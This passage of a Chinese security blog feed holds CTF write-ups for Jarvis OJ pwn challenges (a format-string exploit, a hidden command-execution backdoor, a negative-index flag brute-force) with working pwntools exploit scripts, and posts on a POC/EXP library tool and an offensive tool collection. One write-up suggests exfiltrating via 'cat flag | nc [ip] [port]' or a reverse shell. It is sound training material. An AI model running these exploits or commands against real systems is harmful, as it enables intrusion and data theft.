class="line">  <span class="built_in">char</span> a[] = <span class="string">&quot;coldsnap&quot;</span>;</span><br><span class="line">  printf(n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种方式写法上没什么问题，但是当把字符串输入权交给用户时，就会造成严重的问题。考虑这样一个程序：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>(<span class="params"><span class="built_in">int</span> argc, <span class="built_in">char</span> *argv[]</span>)</span> &#123;</span><br><span class="line"><span class="built_in">char</span> s[<span class="number">100</span>];</span><br><span class="line">scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">printf(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户输入的不是正常的字符串，而是格式化字符串<code>%x%x</code>，则会输出内存中的数据：</p><p><img src="/img/fm/fm4.png"></p><p>这是由于printf函数并不知道参数个数，在其内部有个指针，用来检索格式化字符串。对于特定类型的格式化字符串，去取相应参数的值，直到结束。所以尽管程序中没有参数，上面的代码也会将输入的fromat string后面的内存当作参数以%x即16进制方式输出，造成内存泄漏的问题。</p><p>通过内存泄露问题就要引申到任意内存读取的问题上，当然前提是需要确定局部变量是储存在栈中，这样理论上通过很多个<code>%x</code>就可以读到想要的内存位置。</p><p>也可通过<code>%&lt; number&gt;$x</code>是直接读取第number个位置的参数，同样可以用在%n，%d等等。</p><p>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是<code>%7$n</code>。</p><p>甚至通过这个漏洞可以实现任意地址写入，需要用到linux自带的printf命令，将shellcode编码转义为字符。（注意用反引号将printf命令括住，反引号在Tab键的上面，反引号内的内容会被当做命令执行。）如果是用scanf输入字符串，则无法使用printf命令，只能对照ascii码表，scanf和命令行输入的shellcode编码不能直接被转义。</p><p>例如通过<code>&quot;</code>printf ‘\x41\x41\x41\x41’<code>&quot;</code>将0x41414141这个地址写入内存，下面只需用%s读取对应位置，就能读取以0x41414141为首地址的字符串。</p><p>如果用%n就能将0x41414141这个地址指向的值修改，就能造成任意内存的修改，可以将栈中返回地址修改为想要执行的shellcode的首地址等等。</p><p>这里要注意ASLR的问题。</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>接下来就来继续分析刚开始那道题。</p><p>通过Analysis部分的分析，程序中存在格式化字符串漏洞。通过<code>x_addr%[i]$n</code>命令，可以将已经输出的字符个数写入到指定的参数中，这个格式化字符串会在栈上的某处，需要定位x_addr作为printf的第几个参数来确定[i]的值，由于x_addr在32位程序中刚好是4个字节，所以这个格式化字符串刚好能把相应参数变为4。</p><p>首先是main函数中的x位置，根据下图x_addr应该是0x804a02c：</p><p><img src="/img/fm/fm5.png"></p><p>然后再确定偏移：</p><p><img src="/img/fm/fm6.png"></p><p>将程序断在printf函数，发现输入的数据“aaaaaa”在栈上地址为0xffb171ec，原来数据的地址为0xffb171c0。两者地址差值便是偏移为44。这个程序是32位程序，每个格式化字符串位4字节，所以偏移数为11。</p><p>最后就是写脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;pwn2.jarvisoj.com&#x27;, &#x27;9895&#x27;)</span></span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x804a02c</span></span><br><span class="line"></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本本地运行结果：</p><p><img src="/img/fm/fm7.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 61DCTF </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ - HTTP の Write-Up</title>
      <link href="/2020/09/03/HTTP/"/>
      <url>/2020/09/03/HTTP/</url>
      
        <content type="html"><![CDATA[<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>运行程序和Guess一样也没有回显，猜测也是一个开放端口的操作，checksec一下：</p><p><img src="/img/HTTP/HTTP1.png"></p><span id="more"></span><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>直接进入逆向代码阶段，IDA打开程序，首先是main函数。果然又是一个socket服务器端模型，监听端口为0x70F即1807:</p><p><img src="/img/HTTP/HTTP2.png"></p><p>根据伪代码，这个sub_40137C函数就是处理函数了，看下这个函数：</p><p><img src="/img/HTTP/HTTP3.png"></p><p>又牵扯到一堆函数，一个一个看下，首先是sub_40125D函数：</p><p><img src="/img/HTTP/HTTP4.png"></p><p>结合ASC II码，函数中间最长的if判断应该改写为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span class="number">3</span></span><br><span class="line">    || s[v6 - <span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    || s[v6 - <span class="number">2</span>] != <span class="string">&#x27;\r&#x27;</span></span><br><span class="line">    || s[v6 - <span class="number">3</span>] != <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    || s[v6 - <span class="number">4</span>] != <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>通过这个结构我们发现这是将HTTP请求包的Header和Body部分分开进行处理。这里主要是针对Header部分的处理是通过sub_40116C函数：</p><p><img src="/img/HTTP/HTTP5.png"></p><p>“User-Agent:  ”的数据放在v4中由sub_400FAF函数先做个判断，此外Header中需要有个“back: ”的参数，且该参数将由sub_40102F函数处理。先看下这个函数和这个奇怪的“back: ”参数：</p><p><img src="/img/HTTP/HTTP6.png"></p><p>这个函数看起来存在问题，提及到了可以执行shell命令的popen函数，错误回复信息中也提到了“command”的字眼，猜测是个可以导致命令执行的重点函数。</p><p>回头去看下处理“User-Agent:  ”字段的sub_400FAF函数：</p><p><img src="/img/HTTP/HTTP7.png"></p><p>首先是通过sub_400D30函数得到s，然后将s与“User-Agent:  ”提交的数据循环做异或，看下sub_400D30函数：</p><p><img src="/img/HTTP/HTTP8.png"></p><p>sub_400CEA函数：</p><p><img src="/img/HTTP/HTTP9.png"></p><p>sub_400C86函数：</p><p><img src="/img/HTTP/HTTP10.png"></p><p>大体上来说这个函数对数据进行一系列操作，但是并不需要了解细节。因为在sub_400FAF函数中发现sub_400D30函数操作的off_601CF0位置的数据，和我们的输入没有任何关系。所以理论上说sub_400D30函数的结果对于我们来说就是个固定的数值，只需要控制程序执行这个函数，然后直接读取最终数值就可以。</p><p>最后再看下sub_40116C函数中最后提到的sub_4010DF函数：</p><p><img src="/img/HTTP/HTTP11.png"></p><p>这就是个普通的提示函数，没什么重要信息。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>经过伪代码的分析，发现这个大致类似一个Webshell的方式。我们需要在HTTP的Header中提供User-agent 字段以及 back 字段。其中User-agent 字段的数据类似Webshell的password，与程序中的数据做对比。而back 字段是要执行的命令，程序收到包做了验证之后就会执行提交的命令，然后将命令执行结果在响应包的Body中返回。</p><p>根据上一步的分析，我们需要调试程序找到我们需要的User-agent 字段的数据，通过hopper发现直接在0x400fca位置下个断点就可以：</p><p><img src="/img/HTTP/HTTP12.png"></p><p>根据sub_400d30函数，执行完之后结果会放到RAX寄存器中去：</p><p><img src="/img/HTTP/HTTP13.png"></p><p>gdb attach上去下断点（下在主进程上）：</p><p><img src="/img/HTTP/HTTP14.png"></p><p>然后nc上去会fork一个子进程，输入按要求的payload，触发sub_400D30函数：</p><p><img src="/img/HTTP/HTTP15.png"></p><p>主进程断在我们想要的地方，发现了函数输出完之后，RAX寄存器中的数据：2016CCE</p><p><img src="/img/HTTP/HTTP16.png"></p><p>下面就是EXP脚本的编写了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1807</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;2016CCRT&#x27;</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> key:</span><br><span class="line">password += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ num)</span><br><span class="line">num += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;password: &quot;</span> + password</span><br><span class="line"></span><br><span class="line">command = <span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span></span><br><span class="line">payload += <span class="string">&quot;User-Agent: %s\r\n&quot;</span> % (password)</span><br><span class="line">payload += <span class="string">&quot;back: %s\r\n&quot;</span> % (command)</span><br><span class="line">payload += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">payload += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;payload: &quot;</span> + payload</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>本地运行通过：</p><p><img src="/img/HTTP/HTTP17.png"></p><p><img src="/img/HTTP/HTTP18.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>但是远程执行时，首先不知道flag文件格式。其次根据本地调试结果来看，回显的内容是在服务端，无法到达客户端，客户端只能通过Content-Length 字段得知了命令执行输出结果的长度。所以有以下几种方法：</p><ul><li><p>通过一台公网服务器监听某个端口, 然后让目标服务器去执行<code>cat flag | nc [ip] [port]</code>命令将<code>cat flag</code>的输出结果发送给公网服务器的指定端口</p></li><li><p>使用<code>awk</code>等字符串处理命令来逐个字符读取flag，然后对这个字符进行判断是不是等于某一个字符，根据判断的结果产生不同的输出我们就可以根据这个输出的不同来判断这个我们猜测的字符是不是正确</p></li><li><p>最暴力的方法，直接反弹shell</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ - Guess の Write-Up</title>
      <link href="/2020/08/31/Guess/"/>
      <url>/2020/08/31/Guess/</url>
      
        <content type="html"><![CDATA[<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先尝试运行程序，发现没有任何回显：</p><p><img src="/img/Guess/Guess1.png"></p><span id="more"></span><p>checksec一下：</p><p><img src="/img/Guess/Guess2.png"></p><p>开启了DEP，栈上不可执行。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>将程序丢到IDA中，首先是main函数：</p><p><img src="/img/Guess/Guess3.png"></p><p>这很明显是一个socket服务器端的代码，监听的端口是0x270f即9999。nc上去看一下：</p><p><img src="/img/Guess/Guess4.png"></p><p>再回到程序中去看下处理函数handle()：</p><p><img src="/img/Guess/Guess5.png"></p><p>首先有一个alarm定时函数超时退出，会影响动态调试，可以把这个函数用NOP patch掉。后面接收的输入长度和申明的变量长度一致，不存在溢出。</p><p>接着是rtrim()函数：</p><p><img src="/img/Guess/Guess6.png"></p><p>这个函数把输入的字符串下标为奇数位的位置清０，但是gdb attach上去看了一下发现并没有改变。</p><p>根据逆向的伪代码发现是通过fork创建子程序而不是多线程，所以需要找一下具体子程序的进程号：</p><p><img src="/img/Guess/Guess7.png"></p><p>152是父进程的进程号，<code>nc 127.0.0.1 9999</code>之后程序会fork一个子进程，进程号为155。接下来<code>gdb attach 155</code>看下子进程的堆栈信息：</p><p><img src="/img/Guess/Guess8.png"></p><p>在连接的程序界面输入100个‘1’跳过第一段输入字符长度的检测：</p><p><img src="/img/Guess/Guess9.png"></p><p>在执行rtrim()函数之前的位置下个断点：</p><p><img src="/img/Guess/Guess10.png"></p><p>再在执行完rtrim()函数后下个断点：</p><p><img src="/img/Guess/Guess11.png"></p><p>发现输入的字符串并没有改变……那就跳过不管了。最后调用了is_flag_correct()函数：</p><p><img src="/img/Guess/Guess12.png"></p><p>该函数首先检测输入的字符串长度是不是100，输入存放在flag_hex。然后将0x401100位置的数据复制到bin_by_hex，0x401100位置的数据除了0-9以及大小写ABCDEF之外都是0xFF。接着将FAKE{9b355e394d2070ebd0df195d8b234509cc29272bc412}赋给flag（当然这是假的flag）。</p><p>接下来是函数的主体部分，对用户输入的字符串进行处理，每两位为一组，循环50次。将输入的字符在bin_by_hex中寻找对应的值，如果不在0-9以及大小写ABCDEF中时退出程序。然后通过’｜’运算将输入的100字节长度的字符串变为50字节长度，再比较given_flag和flag，返回比较结果。</p><p>这里是将flag_hex字符串的ASC II值当作bin_by_hex的索引，相当于将原来char类型的变量转换成了int类型，就会造成问题。当我们控制输入的字符串最终变为负数的索引时，程序就会回去找对应的值。</p><p>而根据栈的布局，bin_by_hex的地址是高于flag的，结合上一句提到的负索引问题，我们就可以实现将given_flag设置为真正的flag从而通过检验。</p><p>但是我们依然不清楚真正的flag是什么，所以将正确的flag修改每一位，猜测每一位，这样最终猜解出来flag。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>分析结束就是具体怎么利用了，首先根据id_flag_correct函数bin_by_hex和flag相距0x40即64，所以我们需要控制索引每位减64。</p><p>测试脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>, <span class="number">9878</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload += <span class="string">&quot;0&quot;</span> + <span class="built_in">chr</span>(<span class="number">0x40</span> + <span class="number">128</span> + i)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;guess&gt; &quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>运行结果如下图所示：</p><p><img src="/img/Guess/Guess13.png"></p><p>可见我们成功的将given_flag设置为了真正的flag，通过了检测。下一步就是要尝试一个一个的爆破，获取正确的flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>, <span class="number">9878</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload += <span class="string">&quot;0&quot;</span> + <span class="built_in">chr</span>(<span class="number">0x40</span> + <span class="number">128</span> + i)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;guess&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">list</span>(payload)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">        shellcode[<span class="number">2</span> * i]  = j.encode(<span class="string">&#x27;hex&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        shellcode[<span class="number">2</span> * i + <span class="number">1</span>] = j.encode(<span class="string">&#x27;hex&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        sh.sendline(<span class="string">&quot;&quot;</span>.join(shellcode))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> shellcode)</span><br><span class="line"></span><br><span class="line">        ans = sh.recvline()</span><br><span class="line">        <span class="built_in">print</span> ans</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;Yaaaay!&#x27;</span> <span class="keyword">in</span> ans) == <span class="number">1</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果：</p><p><img src="/img/Guess/Guess14.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PocLibrary - 界面版POC/EXP仓库</title>
      <link href="/2020/08/24/PocLibrary/"/>
      <url>/2020/08/24/PocLibrary/</url>
      
        <content type="html"><![CDATA[<h2 id="项目起源"><a href="#项目起源" class="headerlink" title="项目起源"></a>项目起源</h2><p>主要在于自己的强迫症。</p><p>在做渗透测试或者漏洞验证工作，以及平时玩靶机的时候收集了大量的POC&#x2F;EXP的脚本，包括在Github上fork了各路大神写的脚本，导致本地文件夹和Github仓库混乱，找起来不是很方便。正好看到了<a href="https://github.com/zhzyker/exphub">@zhzyker的exphub项目</a>，于是借着这个机会把POC&#x2F;EXP脚本规整一下，做一个界面化的工具出来，就有了<a href="https://github.com/Coldwave96/PocLibrary">PocLibrary</a>项目。</p><span id="more"></span><h2 id="UI搭建"><a href="#UI搭建" class="headerlink" title="UI搭建"></a>UI搭建</h2><p>很久很久之前用C#做过GUI的开发，长时间没用C#，现在已经忘的差不多了。只能去了解一下Python的GUI开发。</p><p>Python下的开发GUI的库大体上有PyQt，wxPython和Tkinter。由于这次的界面设计的也比较简单，3种框架差别不大。刚好wxPython有一个类似C# MFC的工具<a href="https://github.com/wxFormBuilder/wxFormBuilder">wxFormBuilder</a>，于是最终选择了wxPython框架开发GUI界面。</p><p>首先设计一个选择POC&#x2F;EXP模块的主界面：</p><p><img src="/img/PocLibrary/PocLibrary1.png"></p><p>然后再设计一个显示某个POC&#x2F;EXP脚本信息的子界面：</p><p><img src="/img/PocLibrary/PocLibrary2.png"></p><p>考虑到错误处理，于是再创建一个错误信息告警界面：</p><p><img src="/img/PocLibrary/PocLibrary3.png"></p><p>这时wxFormBuilder会帮我们自动生成好界面的代码：</p><p><img src="/img/PocLibrary/PocLibrary4.png"></p><p>可以看到有很多种语言的版本，我们选择Python版的。</p><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><p>界面搭好之后就是按照界面上的预想功能去实现。在主界面上有一个下拉的List，可以选择POC&#x2F;EXP模块。</p><p><img src="/img/PocLibrary/PocLibrary5.png"></p><p>图中展示了1.0版本中的模块，目前总共有14个模块，具体参见<a href="https://github.com/Coldwave96/PocLibrary">项目主页</a>。</p><p>选好模块之后，点击确定Button会触发Bind的事件，根据提交的模块的值去定制显示信息的子界面。在子界面中继续选择想要查看的POC&#x2F;EXP脚本，点击确定Button显示POC&#x2F;EXP信息、POC&#x2F;EXP脚本的用法以及对应的漏洞信息。</p><p><img src="/img/PocLibrary/PocLibrary6.png"></p><p>并提供了Copy功能复制POC&#x2F;EXP脚本内容，但是目前有些脚本因为Bug无法复制，只能手动复制。</p><p>没有做自动执行的功能，主要是考虑到POC&#x2F;EXP都是从各个地方收集而来，执行的命令包括执行时需要的环境都不一样，很难做到统一，所以目前就仅仅实现了简单的Copy供用户复制出来自行配环境运行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>更多信息见项目主页。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Program </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackINonE - 工具轮子</title>
      <link href="/2020/08/20/HackINonE/"/>
      <url>/2020/08/20/HackINonE/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>在Github上看到一款很不错的Python3实现的框架，读了下代码发现很适合用来打造工具轮子。刚好最近项打造一款能够根据自己的需求灵活定制的工具集，于是有了<a href="https://github.com/coldwave96/HackINonE">HackINonE</a>这个项目。经过不懈的努力，终于v1.0版本算是打造成功，后面应该还会根据需要继续更新版本，优化工具。</p><span id="more"></span><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>[√] 根据个人喜好定制工具集</li><li>[√] 轻松简单的添加新工具、新模块</li><li>[√] 实现系统、工具集双更新</li></ul><h2 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h2><ul><li>[⚠️] 本工具仅用做学习或授权测试环境！</li><li>[⚠️] 请尊重当地法律！</li><li>[⚠️] 不得用于非法用途，否则后果自负！</li></ul><h2 id="Modules-amp-amp-Tools"><a href="#Modules-amp-amp-Tools" class="headerlink" title="Modules &amp;&amp; Tools"></a>Modules &amp;&amp; Tools</h2><p>这里仅列出v1.0版本的工具列表，后续版本的更新请关注项目地址<a href="https://github.com/coldwave96/HackINonE">https://github.com/coldwave96/HackINonE</a>。</p><h3 id="Anonymously-Hiding-Tools（网络隐藏模块）"><a href="#Anonymously-Hiding-Tools（网络隐藏模块）" class="headerlink" title="Anonymously Hiding Tools（网络隐藏模块）"></a>Anonymously Hiding Tools（网络隐藏模块）</h3><ul><li><a href="https://github.com/Und3rf10w/kali-anonsurf">Anonmously Surf</a></li><li><a href="https://github.com/trimstray/multitor">Multitor</a></li></ul><h3 id="Information-gathering-tools（信息收集模块）"><a href="#Information-gathering-tools（信息收集模块）" class="headerlink" title="Information gathering tools（信息收集模块）"></a>Information gathering tools（信息收集模块）</h3><ul><li><a href="https://github.com/nmap/nmap">Network Map (nmap)</a></li><li><a href="https://github.com/Screetsec/Dracnmap">Dracnmap</a></li><li>Port scanning</li><li>Host to IP </li><li><a href="https://github.com/LionSec/xerosploit">Xerosploit</a></li><li><a href="https://github.com/Tuhinshubhra/RED_HAWK">RED HAWK (All In One Scanning)</a></li><li><a href="https://github.com/bhavsec/reconspider">ReconSpider(For All Scaning)</a></li><li>IsItDown (Check Website Down&#x2F;Up)</li><li><a href="https://github.com/m4ll0k/Infoga">Infoga - Email OSINT</a></li><li><a href="https://github.com/s0md3v/ReconDog">ReconDog</a></li><li><a href="https://github.com/s0md3v/Striker">Striker</a></li><li><a href="https://github.com/m4ll0k/SecretFinder">SecretFinder (like API &amp; etc)</a></li><li><a href="https://github.com/m4ll0k/Shodanfy.py">Find Info Using Shodan</a></li><li><a href="https://github.com/floriankunushevci/rang3r">Port Scanner - rang3r</a></li><li><a href="https://github.com/s0md3v/Breacher">Breacher</a></li><li><a href="https://github.com/3xp10it/xcdn">XCDN</a></li><li><a href="https://github.com/TideSec/TideFinger">TideFinger</a></li><li><a href="https://github.com/1N3/Goohak">GooHak</a></li><li><a href="https://github.com/UnkL4b/GitMiner">GitMiner</a></li><li><a href="https://github.com/abdulgaphy/r3con1z3r">R3con1z3r</a></li><li><a href="https://github.com/0xHJK/dumpall">Dumpall</a></li></ul><h3 id="Wordlist-Generator（字典生成模块）"><a href="#Wordlist-Generator（字典生成模块）" class="headerlink" title="Wordlist Generator（字典生成模块）"></a>Wordlist Generator（字典生成模块）</h3><ul><li><a href="https://github.com/Mebus/cupp.git">Cupp</a></li><li><a href="https://github.com/Z4nzu/wlcreator">WordlistCreator</a></li><li><a href="https://github.com/UndeadSec/GoblinWordGenerator">Goblin WordGenerator</a></li><li><a href="https://github.com/Viralmaniar/SMWYG-Show-Me-What-You-Got">Password list (1.4 Billion Clear Text Password)</a></li></ul><h3 id="Weak-Password-Brute-Tools（弱口令爆破模块）"><a href="#Weak-Password-Brute-Tools（弱口令爆破模块）" class="headerlink" title="Weak Password Brute Tools（弱口令爆破模块）"></a>Weak Password Brute Tools（弱口令爆破模块）</h3><ul><li><a href="https://github.com/TideSec/web_pwd_common_crack">web_pwd_common_crack</a></li><li><a href="https://github.com/s0md3v/Blazy">Blazy</a></li></ul><h3 id="Wireless-attack-tools（无线攻击模块）"><a href="#Wireless-attack-tools（无线攻击模块）" class="headerlink" title="Wireless attack tools（无线攻击模块）"></a>Wireless attack tools（无线攻击模块）</h3><ul><li><a href="https://github.com/P0cL4bs/wifipumpkin3">WiFi-Pumpkin</a></li><li><a href="https://github.com/wiire/pixiewps">pixiewps</a></li><li><a href="https://github.com/andrewmichaelsmith/bluepot">Bluetooth Honeypot GUI Framework</a></li><li><a href="https://github.com/thehackingsage/Fluxion">Fluxion</a></li><li><a href="https://github.com/wifiphisher/wifiphisher">Wifiphisher</a></li><li><a href="https://github.com/derv82/wifite2">Wifite</a></li><li><a href="https://github.com/Z4nzu/fakeap">EvilTwin</a></li><li><a href="https://github.com/Z4nzu/fastssh">Fastssh</a></li><li>Howmanypeople</li></ul><h3 id="SQL-Injection-Tools（SQL注入攻击模块）"><a href="#SQL-Injection-Tools（SQL注入攻击模块）" class="headerlink" title="SQL Injection Tools（SQL注入攻击模块）"></a>SQL Injection Tools（SQL注入攻击模块）</h3><ul><li><a href="https://github.com/sqlmapproject/sqlmap">Sqlmap tool</a></li><li><a href="https://github.com/codingo/NoSQLMap">NoSqlMap</a></li><li><a href="https://github.com/stamparm/DSSS">Damn Small SQLi Scanner</a></li><li><a href="https://github.com/dtag-dev-sec/explo">Explo</a></li><li><a href="https://github.com/JohnTroony/Blisqy">Blisqy - Exploit Time-based blind-SQL injection</a></li><li><a href="https://github.com/leviathan-framework/leviathan">Leviathan - Wide Range Mass Audit Toolkit</a></li><li><a href="https://github.com/Cvar1984/sqlscan">SQLScan</a></li><li><a href="https://github.com/youngyangyang04/NoSQLAttack">NoSQLAttack</a></li><li><a href="https://github.com/m8r0wn/enumdb">Enumdb</a></li></ul><h3 id="Phishing-attack-tools（钓鱼攻击模块）"><a 